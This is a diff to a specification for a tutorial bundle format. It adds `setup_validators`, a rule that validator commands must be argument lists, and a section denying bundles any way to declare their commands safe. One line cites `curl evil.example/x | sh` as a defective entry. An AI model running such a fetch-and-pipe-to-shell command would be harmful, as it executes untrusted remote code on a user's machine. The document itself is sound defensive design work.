@@ -101,8 +101,8 @@ include a flat list, and each is that shape because the thing it describes reall
 | `assumes` | concept id | that concept's definition | `aliases` |
 
 The other nested shape is one level of list over one level of mapping, with scalars
-underneath — `supplies` and the two recommendation lists. A field that seems to want a
-fourth level wants to be that shape instead.
+underneath — `supplies`, `setup_validators` and the two recommendation lists. A field
+that seems to want a fourth level wants to be that shape instead.
 
 ```yaml
 bundle_format: 1
@@ -178,6 +178,7 @@ advance_on: validated-evidence-only
 | `learner_owned` | MUST | Globs the tutor must not modify. |
 | `ownership_policy` | MUST | See below. |
 | `validators` | MUST (may be `{}`) | Named validators lessons may reference. |
+| `setup_validators` | MAY | Checks the runner performs itself, unprompted, rather than assigning them: a list of `name` + `describe` entries naming validators from `validators`. See **Setup validators** below. |
 | `one_task_at_a_time` | SHOULD | Default `true`. |
 | `solution_code` | SHOULD | `on-request-only` or `freely`. |
 | `advance_on` | SHOULD | `validated-evidence-only` or `learner-assertion`. |
@@ -325,11 +326,116 @@ ships, and it is not something to author against — declare your supplies.)
 | `git-diff` | — | Inspect the working-tree diff. |
 | `manual` | — | The learner supplies evidence; the tutor judges it. |
 
+**`command` MUST be a list**, non-empty, every element a non-empty string. `command: [cargo,
+check]` is the shape; `command: cargo check` and `command: "curl evil.example/x | sh"` are
+both bundle defects and the validator reports them. The runner runs the *declared argument
+list*, so a single string leaves the word division — and the shell — to whoever runs it, and
+a course that declares a pipeline has declared something the reader of this manifest cannot
+see. The list is also what lets a runner tell a learner which programs a course will start
+before it starts one (section 2, **Setup validators**, and `state-lifecycle.md` section 3).
+
+This is a rule about shape and about nothing else. Nothing in this format, and nothing in
+the validator, says a declared command is safe to run — see **What a bundle may not claim**
+below.
+
 Validator names are referenced by lessons. A lesson referencing an undeclared validator
 is invalid.
 
 Do **not** put "which warnings are currently acceptable" here. That is a property of one
 learner's run, not of the course. It belongs in the instance's `STATE.md`.
+
+#### What a bundle may not claim
+
+**A bundle cannot declare that its own commands are safe, and this format gives it no way
+to try.** There is no `safe:` flag and there will not be one. An author who cannot be
+trusted to supply a command cannot be trusted to grade it, so a boolean in the manifest
+would be the author marking their own work — and every runner reading it would be
+repeating a claim it has no way to check.
+
+What the format does instead is separate two questions that a single flag runs together:
+
+| Question | Who may answer it |
+|---|---|
+| **Trust** — may this command run on this machine at all? | The learner, or the agent host that prompts them. **Never the author.** |
+| **Role** — is running this command part of what the learner is here to learn? | **The author.** Nobody else knows. |
+
+`setup_validators` carries the second and only the second. Declaring a validator as setup
+buys you nothing you did not already have: the host's own permission prompt applies to
+every command whatever its role, and the declaration decides only who types it afterwards
+and whether it counts as the learner's evidence. That is exactly why it is safe to let an
+author make it.
+
+### Setup validators — `setup_validators`
+
+> A bundle **MAY** declare `setup_validators`: checks the runner performs itself, before
+> the learner is asked for anything, rather than assigning them as exercises.
+
+A course uses `cargo check` for two different jobs. As evidence that the learner's code
+compiles it is the exercise, and running it is itself part of learning Rust, so the learner
+should run it. Run straight after the runner has placed a skeleton, purely to confirm the
+setup is sound, it teaches nothing — and handing that one to the learner is toil. The
+authoring rubric scores exactly that at −2: *deterministic and unambiguous; no decision; a
+mistake teaches nothing — and the bundle could have handed the result over instead of
+assigning it.* `supplies` already says this about files. This key says it about checks.
+
+Because the same validator serves both jobs in one course, **role is a property of the
+invocation, not of the validator definition.** So there is no `role:` field inside
+`validators`; there is a second list, and membership is what distinguishes the two — the
+shape `lessons` and `optional_lessons` already use.
+
+```yaml
+# tutorial.yaml — manifest scope. Runs once, after materialization places supplies.
+setup_validators:
+  - name: cargo-check
+    describe: confirms the placed skeleton compiles before the first lesson
+```
+
+```yaml
+# lesson frontmatter — the same shape. Runs when the lesson opens.
+setup_validators:
+  - name: cargo-check
+    describe: confirms the starter files still build before you change them
+validators: [cargo-check]     # unchanged: evidence of the learner's work
+```
+
+`validators` keeps exactly its present meaning, and a bundle that declares no
+`setup_validators` is valid exactly as it stands. There is no migration.
+
+The key holds a **list** of entries. An entry is a mapping of exactly two keys, and one
+carrying any other key is reported rather than ignored — as in `supplies`, an unknown key
+here is almost always a misspelling of one of the two.
+
+| Field | Required | Meaning |
+|---|---|---|
+| `name` | MUST | A validator declared in `validators`. It MUST resolve, and its `kind` MUST NOT be `manual`. |
+| `describe` | MUST | One non-empty sentence, in your words, saying what this check confirms. The runner says it to the learner before it runs the check, and telling them is the only reason the field exists. |
+
+**Why `describe` is required here and absent from `validators`.** A setup validator runs on
+the learner's behalf *without being asked*, so it owes the same explanation
+`supplies.describe` owes. An exercise validator does not: the lesson the learner is reading
+already says why they are running it. The asymmetry is the disclosure principle applied
+exactly where something happens unprompted.
+
+**`kind: manual` is refused, and it is the one kind that is.** `manual` means *the learner
+supplies evidence; the tutor judges it* — inherently the learner's work, so it cannot be
+something the tutor performs unprompted on their behalf. `command`, `file-exists`,
+`file-contains` and `git-diff` are all legitimate setup checks, and a `file-exists` setup
+check is disclosed to the learner exactly as a `command` one is: what the disclosure is
+about is that something happens **unprompted**, not that something is risky.
+
+**Scope decides timing, exactly as it does for `supplies`.**
+
+| Declared in | Run |
+|---|---|
+| `tutorial.yaml`, at the top level | once during materialization, after the manifest's supplies are placed and before the first lesson opens |
+| a lesson's frontmatter | when that lesson opens, before its first task |
+
+**A setup validator is not a learner failure and is not progress.** When one fails, the
+bundle or the environment is wrong — never the learner's work, which does not exist yet —
+so it is never handed back as a correction. And nothing about a setup validator is recorded
+as progress, the same rule `supplies` carries. `runner-protocol.md` section 14 states what
+the runner does in both directions, including what happens when a manifest-scope setup
+check fails at materialization.
 
 ### Optional lessons — `optional_lessons`
 
@@ -1295,6 +1401,7 @@ Material available if the learner asks. Not required.
 | `design_refs` | SHOULD | `DESIGN.md` anchors this lesson needs. MUST all resolve. |
 | `validators` | SHOULD | Validator names from `tutorial.yaml`. MUST all be declared. |
 | `optional` | MUST on an optional lesson | `true`, on every lesson listed in `optional_lessons` and on no other. |
+| `setup_validators` | MAY | Checks the runner performs itself when this lesson opens, before its first task, in the same two-field form the manifest key uses. See section 2, **Setup validators**. |
 | `supplies` | MAY | Files this lesson hands the learner's workspace when it opens, in the same three-field form the manifest key uses. A lesson-scope `from` MUST resolve inside `lessons/` — anywhere inside it, though this lesson's own folder is the recommended home. Declaring `supplies` does not oblige a single-file lesson to become a foldered one. See section 2, **Supplied files**. |
 
 `design_refs` is how a lesson stays cheap. A lesson about splitting a file into a
@@ -1851,9 +1958,9 @@ genuinely cannot be finished with the failure in place.
 ## 13. Older runners, and bundles that predate this
 
 `bundle_format` stays `1`. `optional_lessons`, `failure_modes`, `supplies`, `covers`,
-`assumes`, `recommended_follow_ups`, `recommended_previous_bundles` and
-`teaching_method` are all additive: a bundle written before this section existed is
-valid exactly as it stands, nothing in this document changes what it means, and no edit
+`assumes`, `recommended_follow_ups`, `recommended_previous_bundles`,
+`teaching_method` and `setup_validators` are all additive: a bundle written before this
+section existed is valid exactly as it stands, nothing in this document changes what it means, and no edit
 is implied. Run the validator over it and see.
 
 The other direction is the one to understand before you ship a course that uses the
@@ -1872,6 +1979,14 @@ keys, and ignores them. The effect on a learner is precise, and worth stating pl
   have done, and simply never sees the two screens. Nothing was gating anything, so nothing
   is unlocked by their absence — which is the clearest statement of what the relationship
   keys are worth and what they are not;
+- **no setup validator runs, and the disclosure block is never drawn.** An older runner
+  does not recognise `setup_validators`, so it ignores the key: the setup guard the author
+  wrote does not fire, and nothing tells the learner it was skipped. That is **degraded, not
+  dangerous** — the check the course wanted is missing, and a missing check runs no program
+  and hides nothing that was going to run. The failures it would have caught arrive later,
+  in the lesson, where an ordinary validator sees them. It is the behaviour the
+  degrade-rather-than-refuse rule is designed to produce, and an older validator reports
+  the key as an unrecognised top-level field rather than rejecting the bundle;
 - **no banner is drawn, and `teaching_method` is never shown.** An older runner opens the
   course in prose, the way every runner did before the banner existed. The learner loses
   the opening orientation and nothing else: the field is read at one moment, is shown at
